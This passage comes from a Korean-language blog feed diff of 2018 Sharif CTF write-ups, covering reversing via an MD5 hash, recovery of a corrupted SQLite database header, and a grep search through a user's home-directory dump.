+&lt;span class=&quot;n&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;2.7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Feb&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2017&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;4.2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Compatible&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Apple&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LLVM&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;8.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;800.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;darwin&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;hashlib&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'404'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;'4f4adcbf8c6f66dcfc8a3282ac2bf10a'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p align=&quot;right&quot;&gt;&lt;strong&gt;SharifCTF{4f4adcbf8c6f66dcfc8a3282ac2bf10a}&lt;/strong&gt;&lt;/p&gt;</content><author><name>suheyon.Jin</name></author><category term="[&quot;CTF&quot;]" /><category term="2018_Sharif" /><category term="Reversing" /><category term="Writeup" /><category term="string" /><summary type="html">Exercise</summary></entry><entry><title type="html">[2018_Sharif_CTF] Crashed DB(50)</title><link href="http://localhost:4000/ctf/Sharif-CTF-Crashed-DB-50/" rel="alternate" type="text/html" title="[2018_Sharif_CTF] Crashed DB(50)" /><published>2018-02-16T00:00:00+09:00</published><updated>2018-02-16T00:00:00+09:00</updated><id>http://localhost:4000/ctf/Sharif-CTF-Crashed-DB-50</id><content type="html" xml:base="http://localhost:4000/ctf/Sharif-CTF-Crashed-DB-50/">&lt;h2 id=&quot;exercise&quot;&gt;Exercise&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;We lost some data when we were delivering our DB.
+Can you recover it??
+Hint: SQLite&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-16-Sharif-CTF-Crashed-DB-50/exercise.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] exercise&lt;/p&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
+
+&lt;p&gt;Forensic 첫번째 문제, DB 전송 과정에서 일부 데이터를 손실했으며, 이를 복구할 수 있는지 묻고 있다. SQLite 가 hint로 주어진 것을 보아, sqlite db 관련 문제임을 확인.&lt;/p&gt;
+
+&lt;p&gt;sqlite3 를 통해, 해당 binary를 읽어보면, db 정보가 전혀 식별되지 않는 것을 확인할 수 있으며 table 조회 시, error를 볼 수 있다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/50_Crashed DB
+ sqlite3 ./db0.db
+SQLite version 3.16.0 2016-11-04 19:09:39
+Enter &lt;span class=&quot;s2&quot;&gt;&quot;.help&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;usage hints.
+sqlite&amp;gt; .dbinfo
+database page size:  0
+write format:        0
+&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;format:         0
+reserved bytes:      0
+file change counter: 0
+database page count: 0
+freelist page count: 0
+schema cookie:       0
+schema format:       0
+default cache size:  0
+autovacuum top root: 0
+incremental vacuum:  0
+text encoding:       0
+user version:        0
+application &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;:      0
+software version:    0
+number of tables:    0
+number of indexes:   0
+number of triggers:  0
+number of views:     0
+schema size:         0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlite&amp;gt; .table
+Error: file is encrypted or is not a database
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;binary 확인 시, signature를 포함한 header 정보가 날아가 있는 것을 확인할 수 있다.
+&lt;img src=&quot;/assets/images/2018-02-16-Sharif-CTF-Crashed-DB-50/init.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] Header information&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;적당한, sqlite db 파일을 하나 만들고 &lt;code class=&quot;highlighter-rouge&quot;&gt;db0.db&lt;/code&gt;의 0번째 offset 인 0x0D 로 구분되는 지점까지의 header offset을 가져다 넣어준다.
+&lt;img src=&quot;/assets/images/2018-02-16-Sharif-CTF-Crashed-DB-50/tmp_header.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] tmp Header&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-16-Sharif-CTF-Crashed-DB-50/fix_header.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] fixed Header&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;remake 한 db 파일의 정보를 확인하여, table 정보를 식별하려 하면, 아래와 같은 error message를 확인할 수 있다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/50_Crashed DB
+ sqlite3 ./remake_db0.db
+SQLite version 3.16.0 2016-11-04 19:09:39
+Enter &lt;span class=&quot;s2&quot;&gt;&quot;.help&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;usage hints.
+sqlite&amp;gt; .dbinfo
+database page size:  1024
+write format:        1
+&lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;format:         1
+reserved bytes:      0
+file change counter: 1
+database page count: 2
+freelist page count: 0
+schema cookie:       1
+schema format:       4
+default cache size:  0
+autovacuum top root: 0
+incremental vacuum:  0
+text encoding:       1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;utf8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+user version:        0
+application &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;:      0
+software version:    3008004
+number of tables:    0
+number of indexes:   0
+number of triggers:  0
+number of views:     0
+schema size:         0
+
+sqlite&amp;gt; .table
+Error: database disk image is malformed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Error 정보를 확인해보면, page 와 관련이 있었다. 주어진 db 의 크기는 8kb size를 가진다. 아래와 같이 page의 크기를 0x1000 (4096) 으로 명시하고, 하나의 page 크기가 0x1000일 때, 해당 db는 8kb 이므로 2 page로 구성된다. 따라서 offset을 0x02로 수정한다.
+&lt;img src=&quot;/assets/images/2018-02-16-Sharif-CTF-Crashed-DB-50/fixed.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;&lt;i&gt;[그림] fixed Header Offset&lt;/i&gt;&lt;/p&gt;
+
+&lt;p&gt;이후, table과 table schema를 정상적으로 식별할 수 있었다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlite&amp;gt; .schema
+CREATE TABLE tbl &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Glaf varchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Flag varchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, Lfag varchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;15&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+sqlite&amp;gt; .table
+tbl
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tbl&lt;/code&gt;이라는 table 내에서 &lt;code class=&quot;highlighter-rouge&quot;&gt;Flag&lt;/code&gt;라는 column을 하나 확인할 수 있는데 해당  정보를 출력하면 flag를 확인할 수 있다.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;✘ jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/50_Crashed DB
+ sqlite3 ./remake_db0.db
+SQLite version 3.16.0 2016-11-04 19:09:39
+Enter &lt;span class=&quot;s2&quot;&gt;&quot;.help&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;usage hints.
+sqlite&amp;gt; &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;Flag from tbl&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+S
+h
+a
+r
+i
+f
+C
+T
+F
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+7
+d
+9
+e
+d
+4
+a
+5
+8
+6
+7
+f
+6
+b
+d
+3
+7
+6
+9
+2
+8
+a
+3
+e
+d
+7
+8
+3
+7
+a
+0
+7
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+sqlite&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p align=&quot;right&quot;&gt;&lt;strong&gt;SharifCTF{7d9ed4a5867f6bd376928a3ed7837a07}&lt;/strong&gt;&lt;/p&gt;</content><author><name>suheyon.Jin</name></author><category term="[&quot;CTF&quot;]" /><category term="2018_Sharif" /><category term="Forensic" /><category term="Writeup" /><category term="sqlite3" /><category term="db" /><summary type="html">Exercise</summary></entry><entry><title type="html">[2018_Sharif_CTF] Client01(75)</title><link href="http://localhost:4000/ctf/Sharif-CTF-Client01-75/" rel="alternate" type="text/html" title="[2018_Sharif_CTF] Client01(75)" /><published>2018-02-15T00:00:00+09:00</published><updated>2018-02-15T00:00:00+09:00</updated><id>http://localhost:4000/ctf/Sharif-CTF-Client01-75</id><content type="html" xml:base="http://localhost:4000/ctf/Sharif-CTF-Client01-75/">&lt;h2 id=&quot;exercise&quot;&gt;Exercise&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Attached file is the homepage of the client01. He knows the flag.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-15-Sharif-CTF-Client01-75/exercise.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] exercise&lt;/p&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
+
+&lt;p&gt;첨부된, Client01의 홈페이지 내에서 Flag를 찾는 문제. 주어진 파일의 압축을 풀면 아래와 같은 디렉토리 구조를 확인할 수 있다. &lt;code class=&quot;highlighter-rouge&quot;&gt;ls -al&lt;/code&gt;로 살펴볼 경우, 숨김 파일로 처리된 항목이 다수 존재하는 것을 확인.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/75_Client01
+ tree ./client01
+./client01
+├── Desktop
+├── Documents
+├── Downloads
+├── Music
+├── Pictures
+├── Public
+├── Templates
+└── Videos
+
+jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/75_Client01
+ls &lt;span class=&quot;nt&quot;&gt;-alr&lt;/span&gt; ./client01
+total 104
+drwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Videos
+drwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Templates
+drwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Public
+drwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Pictures
+drwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Music
+drwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Downloads
+drwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Documents
+drwxr-xr-x@  2 jsh05042  staff     68  1 21 16:33 Desktop
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;@  1 jsh05042  staff   7046  1 21 16:44 .xsession-errors.old
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;@  1 jsh05042  staff   7072  1 24 14:13 .xsession-errors
+drwxr-xr-x@  6 jsh05042  staff    204  2 15 19:12 .thunderbird
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;@  1 jsh05042  staff    675  1 21 16:20 .profile
+drwxr-xr-x@  5 jsh05042  staff    170  2 15 19:12 .mozilla
+drwxr-xr-x@  4 jsh05042  staff    136  2 15 19:12 .local
+drwxr-xr-x@  4 jsh05042  staff    136  2 15 19:12 .gnupg
+drwx------@  2 jsh05042  staff     68  1 21 16:33 .gconf
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;@  1 jsh05042  staff     55  1 21 16:33 .dmrc
+drwxr-xr-x@ 12 jsh05042  staff    408  2 15 19:12 .config
+drwxr-xr-x@  6 jsh05042  staff    204  2 15 19:12 .cinnamon
+drwxr-xr-x@  7 jsh05042  staff    238  2 15 19:11 .cache
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;@  1 jsh05042  staff   3526  1 21 16:20 .bashrc
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;@  1 jsh05042  staff    220  1 21 16:20 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;@  1 jsh05042  staff     51  1 24 14:09 .Xauthority
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;@  1 jsh05042  staff    632  1 24 14:09 .ICEauthority
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;@  1 jsh05042  staff  10244  2 15 19:12 .DS_Store
+drwxr-xr-x   6 jsh05042  staff    204  2 15 19:11 ..
+drwxr-xr-x@ 27 jsh05042  staff    918  2 15 19:11 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;grep 을 이용해, flag 관련 문자열을 탐색한 결과 일부 파일 내에서 해당 문자열이 존재하는 것을 확인해 볼 수 있었다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Sharif_CTF/Forensic/75_Client01
+ &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;flag&quot;&lt;/span&gt; ./client01
+Binary file ./client01/.mozilla/firefox/c3a958fk.default/places.sqlite matches
+Binary file ./client01/.mozilla/firefox/c3a958fk.default/secmod.db matches
+./client01/.thunderbird/5bd7jhog.default/blocklist-addons.json:        &lt;span class=&quot;s2&quot;&gt;&quot;why&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Certain versions of this add-on contains an executable that is flagged by multiple tools as malware. Newer versions no longer use it.&quot;&lt;/span&gt;,
+Binary file ./client01/.thunderbird/5bd7jhog.default/calendar-data/local.sqlite matches
+Binary file ./client01/.thunderbird/5bd7jhog.default/global-messages-db.sqlite matches
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;references&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;recipients&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;size&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/All Mail.msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;size&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;8A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;label&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;8B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;statusOfset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/All Mail.msf:&amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;93&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flag&lt;span class=&quot;o&quot;&gt;)&amp;gt;[&lt;/span&gt;3:^9A&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;^95^93&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/All Mail.msf:    &lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;threadCol&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;visible&quot;&lt;/span&gt;:true,&lt;span class=&quot;s2&quot;&gt;&quot;ordinal&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;flaggedCol&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;visible&quot;&lt;/span&gt;:true,&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Drafts.msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;84&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;references&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;85&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;recipients&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;86&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;87&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;size&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Drafts.msf:    &lt;span class=&quot;o&quot;&gt;={&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;threadCol&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;visible&quot;&lt;/span&gt;:true&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;attachmentCol&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;visible&quot;&lt;/span&gt;:true&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;flaggedCo&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Important.msf:  (87=size)(88=flags)(89=priority)(8A=label)(8B=statusOfset)(8C=numLines)
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Important.msf:    ={&quot;&lt;/span&gt;threadCol&lt;span class=&quot;s2&quot;&gt;&quot;:{&quot;&lt;/span&gt;visible&lt;span class=&quot;s2&quot;&gt;&quot;:true,&quot;&lt;/span&gt;ordinal&lt;span class=&quot;s2&quot;&gt;&quot;:&quot;&lt;/span&gt;1&lt;span class=&quot;s2&quot;&gt;&quot;},&quot;&lt;/span&gt;flaggedCol&lt;span class=&quot;s2&quot;&gt;&quot;:{&quot;&lt;/span&gt;visible&lt;span class=&quot;s2&quot;&gt;&quot;:true,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Sent Mail.msf:  (88=flags)(89=priority)(8A=label)(8B=statusOfset)(8C=numLines)
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Sent Mail.msf:    ={&quot;&lt;/span&gt;threadCol&lt;span class=&quot;s2&quot;&gt;&quot;:{&quot;&lt;/span&gt;visible&lt;span class=&quot;s2&quot;&gt;&quot;:true},&quot;&lt;/span&gt;attachmentCol&lt;span class=&quot;s2&quot;&gt;&quot;:{&quot;&lt;/span&gt;visible&lt;span class=&quot;s2&quot;&gt;&quot;:true},&quot;&lt;/span&gt;flaggedCo&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+./client01/.thunderbird/5bd7jhog.default/ImapMail/imap.gmail.com/[Gmail].sbd/Spam.msf:  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;88&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flags&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;priority&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;8A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;label&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;8B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;statusOfset&lt;span class=&quot;o&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;8C&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;numLines&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
